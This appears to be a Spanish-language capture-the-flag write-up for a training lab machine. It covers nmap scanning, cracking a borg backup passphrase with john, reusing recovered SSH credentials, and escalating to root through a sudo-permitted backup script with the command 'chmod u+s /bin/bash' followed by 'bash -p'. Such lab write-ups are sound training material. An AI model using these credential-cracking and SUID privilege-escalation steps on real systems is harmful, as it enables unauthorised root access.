### nmap 
```python
Nmap scan report for 10.10.154.71
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.84 seconds
```

### Ports:
```c
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
	8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### en la pagina podemos encontrar archivos de configuracion que podemos descargar

![[Pasted image 20231107222735.png]]
descargamos esto para echar un vistazo.
### parece que estamos ante un repositorio. debemos descargarlo configurarlo y montarlo para saber que hay dentro.

### instalacion
```java
	sudo apt install borgbackup   
```
### montamos el directorio de la siguiente manera:
```python
borg mount /home/kali/Desktop/thm/Cyborg/home/field/dev/final_archive /home/kali/Desktop/thm/Cyborg/repository
```
al montar el directorio nos pide una clave la cual buscaremos con john.

![[Pasted image 20231107231024.png]]
buscaremos la clave en el archivo que conseguimos en la pagina llamado passwd utilizaremos john para intentar sacar la clave
![[Pasted image 20231107231157.png]]
### clave
```c
squidward
```

### al montar el repositorio navegamos entre las carpetas y conseguimos algo interesante:
![[Pasted image 20231107232642.png]]
### Credenciales:
```c
alex : S3cretP@s3
```
conseguimos lo que parece ser credenciales del usuario alex. vamos a mirar el pueto 22 SSH las credenciales de alex que hemos conseguido
![[Pasted image 20231107233123.png]]
### escalar privilegios: ejecutamos sudo -l 
![[Pasted image 20231108001114.png]]
parece que todo los usuarios tienen todos los permisos sobre /etc/mp3/backups/backup.sh
vamos hacer un cat para ver que hace este archivo
![[Pasted image 20231108001510.png]]
![[Pasted image 20231108001557.png]]

### parece que el la primera parte del script define una flag y la llama c y al final del script le dice que cmd=$( $ command) 

al parecer todo lo que le indiquemos al script con la flag -c sera igual a comandos ejecutados por cmd. asi que usaremos esto para llamar una bash como root con el siguiente codigo.

llamamos al scritp como sudo de la siguiente forma.
```python
	sudo /etc/mp3backups/backup.sh 
```
llamamos la bandera c y aprovecharemos esto para darle permisos a la bash como usuario root. para despues llamarla. de la siguiente manera.
```python
	sudo /etc/mp3backups/backup.sh -c "chmod u+s /bin/bash"
```
### hacemos bash -p
![[Pasted image 20231108002744.png]]
### hemos cambiado los permisos de la bash para que se ejecute como sudo y cuando hacemos bash -p nos da una bash como root
